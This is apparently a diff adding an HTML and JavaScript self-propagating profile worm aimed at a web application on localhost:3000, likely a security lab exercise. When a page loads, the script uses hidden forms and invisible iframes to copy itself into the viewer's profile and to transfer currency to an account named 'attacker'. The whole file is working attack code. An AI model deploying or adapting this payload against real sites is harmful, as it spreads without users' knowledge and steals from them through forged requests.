@@ -1,0 +1,36 @@
+<div id="worm">
+<script type="text/javascript">
+    var profile_done = false;
+    var transfer_done = false;
+    function post_profile() {
+        document.getElementById("new_profile").value = textarea;
+        document.getElementById("post_profile").submit();
+        profile_done = true;
+    }
+    function post_transfer() {
+        if (profile_done) {
+            document.getElementById("post_transfer").submit();
+            transfer_done = true;
+        }
+    }
+    function exit() {
+        if (transfer_done) {
+        }
+    }
+</script>
+<body onload="post_profile()">
+    <form id="post_profile" method="POST" target="iframe1" action="http://localhost:3000/set_profile">
+        <textarea id="new_profile" name="new_profile" style="display:none;"></textarea>
+    </form>
+    <form id="post_transfer" method="POST" target="iframe2" action="http://localhost:3000/post_transfer">
+        <input name="destination_username" type="hidden" value="attacker">
+        <input name="quantity" type="hidden" value="1">
+    </form>
+    <iframe style="width:0; height:0; border:0; border:none" name="iframe1" onload="post_transfer()"></iframe>
+    <iframe style="width:0; height:0; border:0; border:none" name="iframe2" onload="exit()"></iframe>
+</body>
+
+<script type="text/javascript">
+    var textarea = "<div id='worm'>".concat(document.getElementById('worm').innerHTML).concat("</div>").replace('<form id="post_profile" method="POST" target="iframe1" action="http://localhost:3000/set_profile">', '<body onload="post_profile()"><form id="post_profile" method="POST" target="iframe1" action="http://localhost:3000/set_profile">').replace('<iframe style="width:0; height:0; border:0; border:none" name="iframe2" onload="exit()"></iframe>', '<iframe style="width:0; height:0; border:0; border:none" name="iframe2" onload="exit()"></iframe></body>');
+</script>
+</div>
